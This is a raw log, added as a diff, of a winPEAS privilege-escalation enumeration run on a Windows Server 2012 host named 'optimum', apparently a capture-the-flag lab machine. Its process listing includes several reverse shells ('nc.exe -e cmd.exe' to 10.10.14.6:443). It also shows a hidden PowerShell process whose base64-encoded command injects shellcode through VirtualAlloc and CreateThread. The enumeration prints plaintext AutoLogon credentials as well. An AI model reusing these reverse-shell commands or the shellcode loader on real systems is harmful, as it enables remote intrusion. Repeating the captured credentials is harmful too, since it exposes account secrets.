@@ -1,0 +1,713 @@
+C:\Users\kostas\AppData\Local\Temp\Temp>winPEASany.exe cmd > output.txt
+winPEASany.exe cmd > output.txt
+
+C:\Users\kostas\AppData\Local\Temp\Temp>type output.txt
+type output.txt
+ANSI color bit for Windows is not set. If you are execcuting this from a Windows terminal inside the host you should run REG ADD HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1 and then start a new CMD
+   Creating Dynamic lists, this could take a while, please wait...
+   - Checking if domain...
+   - Getting Win32_UserAccount info...
+   - Creating current user groups list...
+   - Creating active users list...
+   - Creating disabled users list...
+   - Admin users list...
+     
+             *((,.,/((((((((((((((((((((/,  */               
+      ,/*,..*((((((((((((((((((((((((((((((((((,           
+    ,*/((((((((((((((((((/,  .*//((//**, .*(((((((*       
+    ((((((((((((((((**********/########## .(* ,(((((((   
+    (((((((((((/********************/####### .(. (((((((
+    ((((((..******************/@@@@@/***/###### ./(((((((
+    ,,....********************@@@@@@@@@@(***,#### .//((((((
+    , ,..********************/@@@@@%@@@@/********##((/ /((((
+    ..((###########*********/%@@@@@@@@@/************,,..((((
+    .(##################(/******/@@@@@/***************.. /((
+    .(#########################(/**********************..*((
+    .(##############################(/*****************.,(((
+    .(###################################(/************..(((
+    .(#######################################(*********..(((
+    .(#######(,.***.,(###################(..***.*******..(((
+    .(#######*(#####((##################((######/(*****..(((
+    .(###################(/***********(##############(...(((
+    .((#####################/*******(################.((((((
+    .(((############################################(..((((
+    ..(((##########################################(..(((((
+    ....((########################################( .(((((
+    ......((####################################( .((((((
+    (((((((((#################################(../((((((
+        (((((((((/##########################(/..((((((
+              (((((((((/,.  ,*//////*,. ./(((((((((((((((.
+                 (((((((((((((((((((((((((((((/
+
+ADVISORY: winpeas should be used for authorized penetration testing and/or educational purposes only.Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own networks and/or with the network owners permission.
+
+  WinPEAS vBETA VERSION, Please if you find any issue let me know in https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/issues by carlospolop
+
+  [+] Leyend:
+         Red                Indicates a special privilege over an object or something is misconfigured
+         Green              Indicates that some protection is enabled or something is well configured
+         Cyan               Indicates active users
+         Blue               Indicates disabled users
+         LightYellow        Indicates links
+
+   [?] You can find a Windows local PE Checklist here: https://book.hacktricks.xyz/windows/checklist-windows-privilege-escalation
+
+
+  ==========================================(System Information)==========================================
+
+  [+] Basic System Information(T1082&T1124&T1012&T1497&T1212)
+   [?] Check if the Windows versions is vulnerable to some known exploit https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#kernel-exploits
+    Hostname: optimum
+    ProductName: Windows Server 2012 R2 Standard
+    EditionID: ServerStandard
+    ReleaseId: 
+    BuildBranch: 
+    CurrentMajorVersionNumber: 
+    CurrentVersion: 6.3
+    Architecture: AMD64
+    ProcessorCount: 2
+    SystemLang: en-US
+    KeyboardLang: English (United States)
+    TimeZone: (UTC+02:00) Athens, Bucharest
+    IsVirtualMachine: True
+    Current Time: 1/8/2020 3:27:38 ��
+    HighIntegrity: False
+    PartOfDomain: False
+    Hotfixes: KB2959936, KB2896496, KB2919355, KB2920189, KB2928120, KB2931358, KB2931366, KB2933826, KB2938772, KB2949621, KB2954879, KB2958262, KB2958263, KB2961072, KB2965500, KB2966407, KB2967917, KB2971203, KB2971850, KB2973351, KB2973448, KB2975061, KB2976627, KB2977629, KB2981580, KB2987107, KB2989647, KB2998527, KB3000850, KB3003057, KB3014442, 
+
+  [?] Windows vulns search powered by Watson(https://github.com/rasta-mouse/Watson)
+    OS Build Number: 9600
+   Windows version not supported
+
+
+  [+] PowerShell Settings()
+    PowerShell v2 Version: 2.0
+    PowerShell v5 Version: 4.0
+    Transcription Settings: 
+    Module Logging Settings: 
+    Scriptblock Logging Settings: 
+
+  [+] Audit Settings(T1012)
+   [?] Check what is being logged 
+    Not Found
+
+  [+] WEF Settings(T1012)
+   [?] Windows Event Forwarding, is interesting to know were are sent the logs 
+    Not Found
+
+  [+] LAPS Settings(T1012)
+   [?] If installed, local administrator password is changed frequently and is restricted by ACL 
+    LAPS Enabled: LAPS not installed
+
+  [+] Wdigest()
+   [?] If enabled, plain-text crds could be stored in LSASS https://book.hacktricks.xyz/windows/stealing-credentials/credentials-protections#wdigest
+    Wdigest is not enabled
+
+  [+] LSA Protection()
+   [?] If enabled, a driver is needed to read LSASS memory (If Secure Boot or UEFI, RunAsPPL cannot be disabled by deleting the registry key) https://book.hacktricks.xyz/windows/stealing-credentials/credentials-protections#lsa-protection
+    LSA Protection is not enabled
+
+  [+] Credentials Guard()
+   [?] If enabled, a driver is needed to read LSASS memory https://book.hacktricks.xyz/windows/stealing-credentials/credentials-protections#credential-guard
+    CredentialGuard is not enabled
+
+  [+] Cached Creds()
+   [?] If > 0, credentials will be cached in the registry and accessible by SYSTEM user https://book.hacktricks.xyz/windows/stealing-credentials/credentials-protections#cached-credentials
+    cachedlogonscount is 10
+
+  [+] User Environment Variables()
+   [?] Check for some passwords or keys in the env variables 
+    COMPUTERNAME: OPTIMUM
+    PSExecutionPolicyPreference: Bypass
+    HOMEPATH: \Users\kostas
+    LOCALAPPDATA: C:\Users\kostas\AppData\Local
+    PSModulePath: C:\Users\kostas\Documents\WindowsPowerShell\Modules;C:\Program Files (x86)\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules\
+    PROCESSOR_ARCHITECTURE: AMD64
+    Path: C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\
+    CommonProgramFiles(x86): C:\Program Files (x86)\Common Files
+    ProgramFiles(x86): C:\Program Files (x86)
+    PROCESSOR_LEVEL: 23
+    LOGONSERVER: \\OPTIMUM
+    PATHEXT: .COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC;.CPL
+    HOMEDRIVE: C:
+    SystemRoot: C:\Windows
+    SESSIONNAME: Console
+    ALLUSERSPROFILE: C:\ProgramData
+    PUBLIC: C:\Users\Public
+    FP_NO_HOST_CHECK: NO
+    APPDATA: C:\Users\kostas\AppData\Roaming
+    PROCESSOR_REVISION: 3100
+    USERNAME: kostas
+    CommonProgramW6432: C:\Program Files\Common Files
+    USERPROFILE: C:\Users\kostas
+    CommonProgramFiles: C:\Program Files\Common Files
+    OS: Windows_NT
+    USERDOMAIN_ROAMINGPROFILE: OPTIMUM
+    PROCESSOR_IDENTIFIER: AMD64 Family 23 Model 49 Stepping 0, AuthenticAMD
+    ComSpec: C:\Windows\system32\cmd.exe
+    PROMPT: $P$G
+    SystemDrive: C:
+    TEMP: C:\Users\kostas\AppData\Local\Temp
+    ProgramFiles: C:\Program Files
+    NUMBER_OF_PROCESSORS: 2
+    TMP: C:\Users\kostas\AppData\Local\Temp
+    ProgramData: C:\ProgramData
+    ProgramW6432: C:\Program Files
+    windir: C:\Windows
+    USERDOMAIN: OPTIMUM
+
+  [+] System Environment Variables()
+   [?] Check for some passwords or keys in the env variables 
+    FP_NO_HOST_CHECK: NO
+    USERNAME: SYSTEM
+    Path: C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\
+    ComSpec: C:\Windows\system32\cmd.exe
+    TMP: C:\Windows\TEMP
+    OS: Windows_NT
+    windir: C:\Windows
+    PROCESSOR_ARCHITECTURE: AMD64
+    TEMP: C:\Windows\TEMP
+    PATHEXT: .COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC
+    PSModulePath: C:\Windows\system32\WindowsPowerShell\v1.0\Modules\
+    NUMBER_OF_PROCESSORS: 2
+    PROCESSOR_LEVEL: 23
+    PROCESSOR_IDENTIFIER: AMD64 Family 23 Model 49 Stepping 0, AuthenticAMD
+    PROCESSOR_REVISION: 3100
+
+  [+] HKCU Internet Settings(T1012)
+    User Agent: Mozilla/4.0 (compatible; MSIE 8.0; Win32)
+    IE5_UA_Backup_Flag: 5.0
+    ZonesSecurityUpgrade: System.Byte[]
+    EmailName: User@
+    AutoConfigProxy: wininet.dll
+    MimeExclusionListForCache: multipart/mixed multipart/x-mixed-replace multipart/x-byteranges 
+    WarnOnPost: System.Byte[]
+    UseSchannelDirectly: System.Byte[]
+    EnableHttp1_1: 1
+    UrlEncoding: 0
+    SecureProtocols: 2720
+    PrivacyAdvanced: 0
+    DisableCachingOfSSLPages: 0
+    WarnonZoneCrossing: 0
+    CertificateRevocation: 1
+    EnableNegotiate: 1
+    MigrateProxy: 1
+    ProxyEnable: 0
+
+  [+] HKLM Internet Settings(T1012)
+    CodeBaseSearchPath: CODEBASE
+    EnablePunycode: 1
+    WarnOnIntranet: 1
+    MinorVersion: 0
+    ActiveXCache: C:\Windows\Downloaded Program Files
+
+  [+] Drives Information(T1120)
+   [?] Remember that you should search more info inside the other drives 
+    A:\ (Type: Removable)
+    C:\ (Type: Fixed)(Filesystem: NTFS)(Available space: 29 GB)(Permissions: Users [AppendData/CreateDirectories])
+    D:\ (Type: CDRom)
+
+  [+] AV Information(T1063)
+  [X] Exception: Invalid namespace 
+    No AV was detected!!
+    Not Found
+
+  [+] UAC Status(T1012)
+   [?] If you are in the Administrators group check how to bypass the UAC https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#basic-uac-bypass-full-file-system-access
+    ConsentPromptBehaviorAdmin: 5 - PromptForNonWindowsBinaries
+    EnableLUA: 1
+    LocalAccountTokenFilterPolicy: 
+    FilterAdministratorToken: 0
+      [*] LocalAccountTokenFilterPolicy set to 0 and FilterAdministratorToken != 1.
+      [-] Only the RID-500 local admin account can be used for lateral movement.
+
+
+  ===========================================(Users Information)===========================================
+
+  [+] Users(T1087&T1069&T1033)
+   [?] Check if you have some admin equivalent privileges https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#users-and-groups
+  Current user: kostas
+  Current groups: Domain Users, Everyone, Users, Interactive, Console Logon, Authenticated Users, This Organization, Local account, Local, NTLM Authentication
+   =================================================================================================
+
+    OPTIMUM\Administrator: Built-in account for administering the computer/domain
+        |->Groups: Administrators
+        |->Password: CanChange-Expi-Req
+
+    OPTIMUM\Guest(Disabled): Built-in account for guest access to the computer/domain
+        |->Groups: Guests
+        |->Password: NotChange-NotExpi-NotReq
+
+    OPTIMUM\kostas
+        |->Groups: Users
+        |->Password: CanChange-NotExpi-Req
+
+
+  [+] Current Token privileges(T1134)
+   [?] Check if you can escalate privilege using some enabled token https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#token-manipulation
+    SeChangeNotifyPrivilege: SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
+    SeIncreaseWorkingSetPrivilege: DISABLED
+
+  [+] Clipboard text(T1134)
+
+
+  [+] Logged users(T1087&T1033)
+    OPTIMUM\kostas
+
+  [+] RDP Sessions(T1087&T1033)
+    SessID    pSessionName   pUserName      pDomainName              State     SourceIP
+    1         Console        kostas         OPTIMUM                  Active    
+
+  [+] Ever logged users(T1087&T1033)
+    OPTIMUM\Administrator
+    OPTIMUM\kostas
+
+  [+] Looking for AutoLogon credentials(T1012)
+    Some AutoLogon credentials were found!!
+    DefaultUserName               :  kostas
+    DefaultPassword               :  kdeEjDowkS*
+
+  [+] Home folders found(T1087&T1083&T1033)
+    C:\Users\Administrator
+    C:\Users\All Users
+    C:\Users\Default
+    C:\Users\Default User
+    C:\Users\kostas
+    C:\Users\Public : Interactive [WriteData/CreateFiles]
+
+  [+] Password Policies(T1201)
+   [?] Check for a possible brute-force 
+    Domain: Builtin
+    SID: S-1-5-32
+    MaxPasswordAge: 42.22:47:31.7437440
+    MinPasswordAge: 00:00:00
+    MinPasswordLength: 0
+    PasswordHistoryLength: 0
+    PasswordProperties: 0
+   =================================================================================================
+
+    Domain: OPTIMUM
+    SID: S-1-5-21-605891470-2991919448-81205106
+    MaxPasswordAge: 42.00:00:00
+    MinPasswordAge: 00:00:00
+    MinPasswordLength: 0
+    PasswordHistoryLength: 0
+    PasswordProperties: DOMAIN_PASSWORD_COMPLEX
+   =================================================================================================
+
+
+
+  =======================================(Processes Information)=======================================
+
+  [+] Interesting Processes -non Microsoft-(T1010&T1057&T1007)
+   [?] Check if any interesting proccesses for memmory dump or if you could overwrite some binary running https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#running-processes
+    nc(2664)[C:\Users\Public\nc.exe] -- POwn: kostas
+    Permissions: Interactive [WriteData/CreateFiles]
+    Possible DLL Hijacking folder: C:\Users\Public (Interactive [WriteData/CreateFiles])
+    Command Line: "C:\Users\Public\nc.exe" -e cmd.exe 10.10.14.6 443
+   =================================================================================================
+
+    conhost(1056)[C:\Windows\system32\conhost.exe] -- POwn: kostas
+    Command Line: \??\C:\Windows\system32\conhost.exe 0x4
+   =================================================================================================
+
+    vmtoolsd(2476)[C:\Program Files\VMware\VMware Tools\vmtoolsd.exe] -- POwn: kostas
+    Command Line: "C:\Program Files\VMware\VMware Tools\vmtoolsd.exe" -n vmusr
+   =================================================================================================
+
+    WerFault(2924)[C:\Windows\SysWOW64\WerFault.exe] -- POwn: kostas
+    Command Line: C:\Windows\SysWOW64\WerFault.exe -u -p 1908 -s 316
+   =================================================================================================
+
+    cmd(2296)[C:\Windows\SysWOW64\cmd.exe] -- POwn: kostas
+    Command Line: cmd.exe
+   =================================================================================================
+
+    cmd(1372)[C:\Windows\SysWOW64\cmd.exe] -- POwn: kostas
+    Command Line: cmd.exe
+   =================================================================================================
+
+    cmd(2208)[C:\Windows\SysWOW64\cmd.exe] -- POwn: kostas
+    Command Line: cmd
+   =================================================================================================
+
+    taskhostex(1840)[C:\Windows\system32\taskhostex.exe] -- POwn: kostas
+    Command Line: taskhostex.exe 
+   =================================================================================================
+
+    nc(2992)[C:\Users\Public\nc.exe] -- POwn: kostas
+    Permissions: Interactive [WriteData/CreateFiles]
+    Possible DLL Hijacking folder: C:\Users\Public (Interactive [WriteData/CreateFiles])
+    Command Line: "C:\Users\Public\nc.exe" -e cmd.exe 10.10.14.6 443
+   =================================================================================================
+
+    explorer(1740)[C:\Windows\Explorer.EXE] -- POwn: kostas
+    Command Line: C:\Windows\Explorer.EXE
+   =================================================================================================
+
+    powershell(1744)[C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe] -- POwn: kostas
+    Command Line: "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -W Hidden -nop -ep bypass -NoExit -E JABZAHgAegBzAE8AVQBCAFQAbQBJAGsAcwBZAGgAVwAgAD0AIABAACIADQAKAFsARABsAGwASQBtAHAAbwByAHQAKAAiAGsAZQByAG4AZQBsADMAMgAuAGQAbABsACIAKQBdAA0ACgBwAHUAYgBsAGkAYwAgAHMAdABhAHQAaQBjACAAZQB4AHQAZQByAG4AIABJAG4AdABQAHQAcgAgAFYAaQByAHQAdQBhAGwAQQBsAGwAbwBjACgASQBuAHQAUAB0AHIAIABsAHAAQQBkAGQAcgBlAHMAcwAsACAAdQBpAG4AdAAgAGQAdwBTAGkAegBlACwAIAB1AGkAbgB0ACAAZgBsAEEAbABsAG8AYwBhAHQAaQBvAG4AVAB5AHAAZQAsACAAdQBpAG4AdAAgAGYAbABQAHIAbwB0AGUAYwB0ACkAOwANAAoAWwBEAGwAbABJAG0AcABvAHIAdAAoACIAawBlAHIAbgBlAGwAMwAyAC4AZABsAGwAIgApAF0ADQAKAHAAdQBiAGwAaQBjACAAcwB0AGEAdABpAGMAIABlAHgAdABlAHIAbgAgAEkAbgB0AFAAdAByACAAQwByAGUAYQB0AGUAVABoAHIAZQBhAGQAKABJAG4AdABQAHQAcgAgAGwAcABUAGgAcgBlAGEAZABBAHQAdAByAGkAYgB1AHQAZQBzACwAIAB1AGkAbgB0ACAAZAB3AFMAdABhAGMAawBTAGkAegBlACwAIABJAG4AdABQAHQAcgAgAGwAcABTAHQAYQByAHQAQQBkAGQAcgBlAHMAcwAsACAASQBuAHQAUAB0AHIAIABsAHAAUABhAHIAYQBtAGUAdABlAHIALAAgAHUAaQBuAHQAIABkAHcAQwByAGUAYQB0AGkAbwBuAEYAbABhAGcAcwAsACAASQBuAHQAUAB0AHIAIABsAHAAVABoAHIAZQBhAGQASQBkACkAOwANAAoAIgBAAA0ACgANAAoAJABmAEYAdABOAE8AUwBiAEoAWABFAFcAeABHAHQAWQAgAD0AIABBAGQAZAAtAFQAeQBwAGUAIAAtAG0AZQBtAGIAZQByAEQAZQBmAGkAbgBpAHQAaQBvAG4AIAAkAFkAeAB6AHMATwBVAEIAVABtAEkAawBzAFkAaABXACAALQBOAGEAbQBlACAAIgBXAGkAbgAzADIAIgAgAC0AbgBhAG0AZQBzAHAAYQBjAGUAIABXAGkAbgAzADIARgB1AG4AYwB0AGkAbwBuAHMAIAAtAHAAYQBzAHMAdABoAHIAdQANAAoADQAKAFsAQgB5AHQAZQBbAF0AXQAgACQAcwBDAGgATQBwAEkAZABwAE4AcABmAFgAIAA9ACAAMAB4AGYAYwAsADAAeABlADgALAAwAHgAOAAyACwAMAB4ADAALAAwAHgAMAAsADAAeAAwACwAMAB4ADYAMAAsADAAeAA4ADkALAAwAHgAZQA1ACwAMAB4ADMAMQAsADAAeABjADAALAAwAHgANgA0ACwAMAB4ADgAYgAsADAAeAA1ADAALAAwAHgAMwAwACwAMAB4ADgAYgAsADAAeAA1ADIALAAwAHgAYwAsADAAeAA4AGIALAAwAHgANQAyACwAMAB4ADEANAAsADAAeAA4AGIALAAwAHgANwAyACwAMAB4ADIAOAAsADAAeABmACwAMAB4AGIANwAsADAAeAA0AGEALAAwAHgAMgA2ACwAMAB4ADMAMQAsADAAeABmAGYALAAwAHgAYQBjACwAMAB4ADMAYwAsADAAeAA2ADEALAAwAHgANwBjACwAMAB4ADIALAAwAHgAMgBjACwAMAB4ADIAMAAsADAAeABjADEALAAwAHgAYwBmACwAMAB4AGQALAAwAHgAMQAsADAAeABjADcALAAwAHgAZQAyACwAMAB4AGYAMgAsADAAeAA1ADIALAAwAHgANQA3ACwAMAB4ADgAYgAsADAAeAA1ADIALAAwAHgAMQAwACwAMAB4ADgAYgAsADAAeAA0AGEALAAwAHgAMwBjACwAMAB4ADgAYgAsADAAeAA0AGMALAAwAHgAMQAxACwAMAB4ADcAOAAsADAAeABlADMALAAwAHgANAA4ACwAMAB4ADEALAAwAHgAZAAxACwAMAB4ADUAMQAsADAAeAA4AGIALAAwAHgANQA5ACwAMAB4ADIAMAAsADAAeAAxACwAMAB4AGQAMwAsADAAeAA4AGIALAAwAHgANAA5ACwAMAB4ADEAOAAsADAAeABlADMALAAwAHgAMwBhACwAMAB4ADQAOQAsADAAeAA4AGIALAAwAHgAMwA0ACwAMAB4ADgAYgAsADAAeAAxACwAMAB4AGQANgAsADAAeAAzADEALAAwAHgAZgBmACwAMAB4AGEAYwAsADAAeABjADEALAAwAHgAYwBmACwAMAB4AGQALAAwAHgAMQAsADAAeABjADcALAAwAHgAMwA4ACwAMAB4AGUAMAAsADAAeAA3ADUALAAwAHgAZgA2ACwAMAB4ADMALAAwAHgANwBkACwAMAB4AGYAOAAsADAAeAAzAGIALAAwAHgANwBkACwAMAB4ADIANAAsADAAeAA3ADUALAAwAHgAZQA0ACwAMAB4ADUAOAAsADAAeAA4AGIALAAwAHgANQA4ACwAMAB4ADIANAAsADAAeAAxACwAMAB4AGQAMwAsADAAeAA2ADYALAAwAHgAOABiACwAMAB4AGMALAAwAHgANABiACwAMAB4ADgAYgAsADAAeAA1ADgALAAwAHgAMQBjACwAMAB4ADEALAAwAHgAZAAzACwAMAB4ADgAYgAsADAAeAA0ACwAMAB4ADgAYgAsADAAeAAxACwAMAB4AGQAMAAsADAAeAA4ADkALAAwAHgANAA0ACwAMAB4ADIANAAsADAAeAAyADQALAAwAHgANQBiACwAMAB4ADUAYgAsADAAeAA2ADEALAAwAHgANQA5ACwAMAB4ADUAYQAsADAAeAA1ADEALAAwAHgAZgBmACwAMAB4AGUAMAAsADAAeAA1AGYALAAwAHgANQBmACwAMAB4ADUAYQAsADAAeAA4AGIALAAwAHgAMQAyACwAMAB4AGUAYgAsADAAeAA4AGQALAAwAHgANQBkACwAMAB4ADYAOAAsADAAeAAzADMALAAwAHgAMwAyACwAMAB4ADAALAAwAHgAMAAsADAAeAA2ADgALAAwAHgANwA3ACwAMAB4ADcAMwAsADAAeAAzADIALAAwAHgANQBmACwAMAB4ADUANAAsADAAeAA2ADgALAAwAHgANABjACwAMAB4ADcANwAsADAAeAAyADYALAAwAHgANwAsADAAeABmAGYALAAwAHgAZAA1ACwAMAB4AGIAOAAsADAAeAA5ADAALAAwAHgAMQAsADAAeAAwACwAMAB4ADAALAAwAHgAMgA5ACwAMAB4AGMANAAsADAAeAA1ADQALAAwAHgANQAwACwAMAB4ADYAOAAsADAAeAAyADkALAAwAHgAOAAwACwAMAB4ADYAYgAsADAAeAAwACwAMAB4AGYAZgAsADAAeABkADUALAAwAHgANQAwACwAMAB4ADUAMAAsADAAeAA1ADAALAAwAHgANQAwACwAMAB4ADQAMAAsADAAeAA1ADAALAAwAHgANAAwACwAMAB4ADUAMAAsADAAeAA2ADgALAAwAHgAZQBhACwAMAB4AGYALAAwAHgAZABmACwAMAB4AGUAMAAsADAAeABmAGYALAAwAHgAZAA1ACwAMAB4ADkANwAsADAAeAA2AGEALAAwAHgANQAsADAAeAA2ADgALAAwAHgAYQAsADAAeABhACwAMAB4AGUALAAwAHgAMQBlACwAMAB4ADYAOAAsADAAeAAyACwAMAB4ADAALAAwAHgAMQAsADAAeABiAGIALAAwAHgAOAA5ACwAMAB4AGUANgAsADAAeAA2AGEALAAwAHgAMQAwACwAMAB4ADUANgAsADAAeAA1ADcALAAwAHgANgA4ACwAMAB4ADkAOQAsADAAeABhADUALAAwAHgANwA0ACwAMAB4ADYAMQAsADAAeABmAGYALAAwAHgAZAA1ACwAMAB4ADgANQAsADAAeABjADAALAAwAHgANwA0ACwAMAB4AGMALAAwAHgAZgBmACwAMAB4ADQAZQAsADAAeAA4ACwAMAB4ADcANQAsADAAeABlAGMALAAwAHgANgA4ACwAMAB4AGYAMAAsADAAeABiADUALAAwAHgAYQAyACwAMAB4ADUANgAsADAAeABmAGYALAAwAHgAZAA1ACwAMAB4ADYAOAAsADAAeAA2ADMALAAwAHgANgBkACwAMAB4ADYANAAsADAAeAAwACwAMAB4ADgAOQAsADAAeABlADMALAAwAHgANQA3ACwAMAB4ADUANwAsADAAeAA1ADcALAAwAHgAMwAxACwAMAB4AGYANgAsADAAeAA2AGEALAAwAHgAMQAyACwAMAB4ADUAOQAsADAAeAA1ADYALAAwAHgAZQAyACwAMAB4AGYAZAAsADAAeAA2ADYALAAwAHgAYwA3ACwAMAB4ADQANAAsADAAeAAyADQALAAwAHgAMwBjACwAMAB4ADEALAAwAHgAMQAsADAAeAA4AGQALAAwAHgANAA0ACwAMAB4ADIANAAsADAAeAAxADAALAAwAHgAYwA2ACwAMAB4ADAALAAwAHgANAA0ACwAMAB4ADUANAAsADAAeAA1ADAALAAwAHgANQA2ACwAMAB4ADUANgAsADAAeAA1ADYALAAwAHgANAA2ACwAMAB4ADUANgAsADAAeAA0AGUALAAwAHgANQA2ACwAMAB4ADUANgAsADAAeAA1ADMALAAwAHgANQA2ACwAMAB4ADYAOAAsADAAeAA3ADkALAAwAHgAYwBjACwAMAB4ADMAZgAsADAAeAA4ADYALAAwAHgAZgBmACwAMAB4AGQANQAsADAAeAA4ADkALAAwAHgAZQAwACwAMAB4ADQAZQAsADAAeAA1ADYALAAwAHgANAA2ACwAMAB4AGYAZgAsADAAeAAzADAALAAwAHgANgA4ACwAMAB4ADgALAAwAHgAOAA3ACwAMAB4ADEAZAAsADAAeAA2ADAALAAwAHgAZgBmACwAMAB4AGQANQAsADAAeABiAGIALAAwAHgAZgAwACwAMAB4AGIANQAsADAAeABhADIALAAwAHgANQA2ACwAMAB4ADYAOAAsADAAeABhADYALAAwAHgAOQA1ACwAMAB4AGIAZAAsADAAeAA5AGQALAAwAHgAZgBmACwAMAB4AGQANQAsADAAeAAzAGMALAAwAHgANgAsADAAeAA3AGMALAAwAHgAYQAsADAAeAA4ADAALAAwAHgAZgBiACwAMAB4AGUAMAAsADAAeAA3ADUALAAwAHgANQAsADAAeABiAGIALAAwAHgANAA3ACwAMAB4ADEAMwAsADAAeAA3ADIALAAwAHgANgBmACwAMAB4ADYAYQAsADAAeAAwACwAMAB4ADUAMwAsADAAeABmAGYALAAwAHgAZAA1AA0ACgANAAoADQAKACQAaQBGAFkAeQB0AE8AagBrACAAPQAgACQAZgBGAHQATgBPAFMAYgBKAFgARQBXAHgARwB0AFkAOgA6AFYAaQByAHQAdQBhAGwAQQBsAGwAbwBjACgAMAAsAFsATQBhAHQAaABdADoAOgBNAGEAeAAoACQAcwBDAGgATQBwAEkAZABwAE4AcABmAFgALgBMAGUAbgBnAHQAaAAsADAAeAAxADAAMAAwACkALAAwAHgAMwAwADAAMAAsADAAeAA0ADAAKQANAAoADQAKAFsAUwB5AHMAdABlAG0ALgBSAHUAbgB0AGkAbQBlAC4ASQBuAHQAZQByAG8AcABTAGUAcgB2AGkAYwBlAHMALgBNAGEAcgBzAGgAYQBsAF0AOgA6AEMAbwBwAHkAKAAkAHMAQwBoAE0AcABJAGQAcABOAHAAZgBYACwAMAAsACQAaQBGAFkAeQB0AE8AagBrACwAJABzAEMAaABNAHAASQBkAHAATgBwAGYAWAAuAEwAZQBuAGcAdABoACkADQAKAA0ACgAkAGYARgB0AE4ATwBTAGIASgBYAEUAVwB4AEcAdABZADoAOgBDAHIAZQBhAHQAZQBUAGgAcgBlAGEAZAAoADAALAAwACwAJABpAEYAWQB5AHQATwBqAGsALAAwACwAMAAsADAAKQANAAoA
+   =================================================================================================
+
+    nc(3068)[C:\Users\Public\nc.exe] -- POwn: kostas
+    Permissions: Interactive [WriteData/CreateFiles]
+    Possible DLL Hijacking folder: C:\Users\Public (Interactive [WriteData/CreateFiles])
+    Command Line: "C:\Users\Public\nc.exe" -e cmd.exe 10.10.14.6 443
+   =================================================================================================
+
+    nc(1732)[C:\Users\Public\nc.exe] -- POwn: kostas
+    Permissions: Interactive [WriteData/CreateFiles]
+    Possible DLL Hijacking folder: C:\Users\Public (Interactive [WriteData/CreateFiles])
+    Command Line: "C:\Users\Public\nc.exe" -e cmd.exe 10.10.14.6 443
+   =================================================================================================
+
+    nc(1908)[C:\Users\Public\nc.exe] -- POwn: kostas
+    Permissions: Interactive [WriteData/CreateFiles]
+    Possible DLL Hijacking folder: C:\Users\Public (Interactive [WriteData/CreateFiles])
+    Command Line: "C:\Users\Public\nc.exe" -e cmd.exe 10.10.14.6 443
+   =================================================================================================
+
+    conhost(1292)[C:\Windows\system32\conhost.exe] -- POwn: kostas
+    Command Line: \??\C:\Windows\system32\conhost.exe 0x4
+   =================================================================================================
+
+    conhost(2164)[C:\Windows\system32\conhost.exe] -- POwn: kostas
+    Command Line: \??\C:\Windows\system32\conhost.exe 0x4
+   =================================================================================================
+
+    cmd(1172)[C:\Windows\SysWOW64\cmd.exe] -- POwn: kostas
+    Command Line: cmd.exe
+   =================================================================================================
+
+    winPEASany(1272)[C:\Users\kostas\AppData\Local\Temp\Temp\winPEASany.exe] -- POwn: kostas -- isDotNet
+    Command Line: winPEASany.exe  cmd 
+   =================================================================================================
+
+    conhost(1800)[C:\Windows\system32\conhost.exe] -- POwn: kostas
+    Command Line: \??\C:\Windows\system32\conhost.exe 0x4
+   =================================================================================================
+
+    WerFault(2096)[C:\Windows\SysWOW64\WerFault.exe] -- POwn: kostas
+    Command Line: C:\Windows\SysWOW64\WerFault.exe -u -p 2664 -s 280
+   =================================================================================================
+
+    cmd(728)[C:\Windows\SysWOW64\cmd.exe] -- POwn: kostas
+    Command Line: cmd.exe
+   =================================================================================================
+
+    conhost(2596)[C:\Windows\system32\conhost.exe] -- POwn: kostas
+    Command Line: \??\C:\Windows\system32\conhost.exe 0x4
+   =================================================================================================
+
+    hfs(2504)[C:\Users\kostas\Desktop\hfs.exe] -- POwn: kostas
+    Command Line: "C:\Users\kostas\Desktop\hfs.exe" 
+   =================================================================================================
+
+    nc(2768)[C:\Users\Public\nc.exe] -- POwn: kostas
+    Permissions: Interactive [WriteData/CreateFiles]
+    Possible DLL Hijacking folder: C:\Users\Public (Interactive [WriteData/CreateFiles])
+    Command Line: "C:\Users\Public\nc.exe" -e cmd.exe 10.10.14.6 443
+   =================================================================================================
+
+    nc(2152)[C:\Users\Public\nc.exe] -- POwn: kostas
+    Permissions: Interactive [WriteData/CreateFiles]
+    Possible DLL Hijacking folder: C:\Users\Public (Interactive [WriteData/CreateFiles])
+    Command Line: "C:\Users\Public\nc.exe" -e cmd.exe 10.10.14.6 443
+   =================================================================================================
+
+    WerFault(3028)[C:\Windows\SysWOW64\WerFault.exe] -- POwn: kostas
+    Command Line: C:\Windows\SysWOW64\WerFault.exe -u -p 2768 -s 312
+   =================================================================================================
+
+
+
+  ========================================(Services Information)========================================
+
+  [+] Interesting Services -non Microsoft-(T1007)
+   [?] Check if you can overwrite some service binary or perform a DLL hijacking, also check for unquoted paths https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#services
+    VGAuthService(VMware, Inc. - VMware Alias Manager and Ticket Service)["C:\Program Files\VMware\VMware Tools\VMware VGAuth\VGAuthService.exe"] - Auto - Running
+    Alias Manager and Ticket Service
+   =================================================================================================
+
+    VMTools(VMware, Inc. - VMware Tools)["C:\Program Files\VMware\VMware Tools\vmtoolsd.exe"] - Auto - Running
+    Provides support for synchronizing objects between the host and guest operating systems.
+   =================================================================================================
+
